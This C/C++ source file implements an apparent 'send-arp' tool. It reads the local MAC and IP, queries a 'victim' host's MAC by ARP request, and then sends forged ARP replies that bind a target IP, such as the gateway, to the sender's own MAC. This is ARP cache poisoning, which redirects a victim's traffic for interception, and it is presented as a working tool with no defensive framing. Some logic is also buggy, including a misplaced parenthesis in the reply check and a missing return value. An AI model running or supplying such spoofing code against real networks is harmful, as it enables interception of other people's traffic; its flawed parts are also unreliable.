#include <net/if.h>
#include <sys/ioctl.h>

#include "func.h"

int MyIpMac(char* dev, char* myip, char* mymac)
{
    struct ifreq ifr;
    int fd ;
    int ret, ret2;
    uint8_t mymacADDR[6];

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        printf("socket failed!!\n");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ret = ioctl(fd, SIOCGIFHWADDR, &ifr);

    if(ret < 0) {
        printf("ioctl failed!!\n");
        return -1;
    }

    memcpy(mymacADDR, ifr.ifr_hwaddr.sa_data, 6);
    sprintf(mymac, "%02x:%02x:%02x:%02x:%02x:%02x",mymacADDR[0], mymacADDR[1], mymacADDR[2], mymacADDR[3], mymacADDR[4], mymacADDR[5]);

    ret2 = ioctl(fd, SIOCGIFADDR, &ifr);

    if(ret2 < 0) {
        printf("ioctl failed!!\n");
        return -1;
    }

    inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2 ,myip, sizeof(struct sockaddr) );
}

Mac GetVictimMac(pcap_t* handler, char* MyIp, Mac MyMac, char* VictimIp) {
    struct pcap_pkthdr* ReplyPacket;
    const u_char* pkt_data;
    int res;
    Mac MacAddr;
    //struct libnet_ethernet_hdr* eth;
    struct EthHdr* eth;
    EthArpPacket packet = CreatePacket(MyMac, Mac("ff:ff:ff:ff:ff:ff"), MyIp, VictimIp, true);

    SendPacket(handler, packet);

    while(1)
    {
        res = pcap_next_ex(handler, &ReplyPacket, &pkt_data);

        if(res == 0) {
            printf("res == 0");
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("%s : pcap_next_ex return %d\n", pcap_geterr(handler), res);
            break;
        }

        struct EthHdr* eth = (struct EthHdr*)(pkt_data);
        struct ArpHdr* ath = (struct ArpHdr*)(pkt_data+14);


        if(ntohs((eth -> type_) == 2054))
            return ath->smac_;
    }


}

EthArpPacket CreatePacket(Mac smac, Mac dmac, char* sip, char* dip, bool isRequest) {
    EthArpPacket packet;

    packet.eth_.dmac_ = dmac;
    packet.eth_.smac_ = smac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;

    if(isRequest)
        packet.arp_.op_ = htons(ArpHdr::Request);
    else
        packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = smac;
    packet.arp_.sip_ = htonl(Ip(sip));

    if(dmac != 0)
        packet.arp_.tmac_ = Mac::broadcastMac();
    else
        packet.arp_.tmac_ = Mac::nullMac();

    packet.arp_.tip_ = htonl(Ip(dip));

    return packet;

}

void SendPacket(pcap_t* handle, EthArpPacket packet){
    int res = pcap_sendpacket(handle,reinterpret_cast<const u_char*>(&packet), sizeof (EthArpPacket));
    if(res != 0) {
        fprintf (stderr, "ERROE = %s : packet return %d \n", pcap_geterr(handle), res);
    }
}

void SendArp(pcap_t* handle, char* senderIp, Mac senderMac, char* targetIp, char* myMac) {

    EthArpPacket packet = CreatePacket(Mac(myMac), senderMac, targetIp, senderIp, false);

    printf("***********************************************\n");

    printf("sender ip  = %s \n",senderIp);
    //printf("sender mac = %s \n", senderMac);
    printf("target ip  = %s \n", targetIp);
    printf("my mac = %s \n", myMac);
    SendPacket(handle,packet);
    printf("success");
    printf("***********************************************\n");
}

void usage() {
   printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
   printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}
